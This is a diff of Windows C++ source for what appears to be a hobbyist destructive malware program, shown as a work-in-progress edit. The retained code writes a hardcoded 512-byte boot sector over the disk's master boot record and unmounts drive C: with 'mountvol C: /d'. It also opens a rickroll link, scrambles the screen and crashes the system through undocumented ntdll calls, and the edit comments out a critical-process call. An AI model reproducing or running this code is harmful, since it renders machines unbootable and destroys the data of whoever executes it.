@@ -14,29 +14,36 @@
 #include <processthreadsapi.h>
 #include <tlhelp32.h>
 #include <utilapiset.h>
-#include "payloads.h"
+//#include "payloads.h"
 
 typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
 typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
     ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
 
-typedef long (WINAPI* RtlSetProcessIsCritical) (
-    IN BOOLEAN    bNew,
-    OUT BOOLEAN* pbOld,
-    IN BOOLEAN    bNeedScb);
+//typedef long (WINAPI* RtlSetProcessIsCritical) (
+//    IN BOOLEAN    bNew,
+//    OUT BOOLEAN* pbOld,
+//    IN BOOLEAN    bNeedScb);
+
+void audio() {
+    while (true) {
+        Sleep(rand() % 10000);
+        Beep(rand() % 2000, rand() % 5000);
+    }
+}
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
 
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
 
     HANDLE ntdll = LoadLibrary(L"ntdll.dll");
-    RtlSetProcessIsCritical SetCriticalProcess;
+    //RtlSetProcessIsCritical SetCriticalProcess;
 
-    SetCriticalProcess = (RtlSetProcessIsCritical)
-        GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+    //SetCriticalProcess = (RtlSetProcessIsCritical)
+    //    GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
 
-    SetCriticalProcess(TRUE, NULL, FALSE);
+    //SetCriticalProcess(TRUE, NULL, FALSE);
 
     const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
@@ -94,14 +101,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     //rick roll
     system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
 
-    void audio() {
-        while (true) {
-            Sleep(rand() % 10000);
-            Beep(rand() % 2000, rand() % 5000);
-        }
-    }
-
-    std::thread beeping(audio);
+    //std::thread beeping(audio); I still dont know how to properly use threads
 
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
@@ -112,7 +112,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
     CloseHandle(hDevice);
 
-     system("mountvol C: /d");
+    system("mountvol C: /d");
 
     DWORD dwVal = 1;
 
@@ -256,9 +256,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         BitBlt(desk, sin(i), cos(i), sw1, h, hdc, rand() % i * 50, rand() % i * 50, PATINVERT);
     }
 
-    for (int i = 1; i < 50; i++) {
+   // for (int i = 1; i < 50; i++) {
 
-    }
+    //}
 
     if (hNtdll != 0) { //crash system using undocumented methods
         NTSTATUS s1, s2;
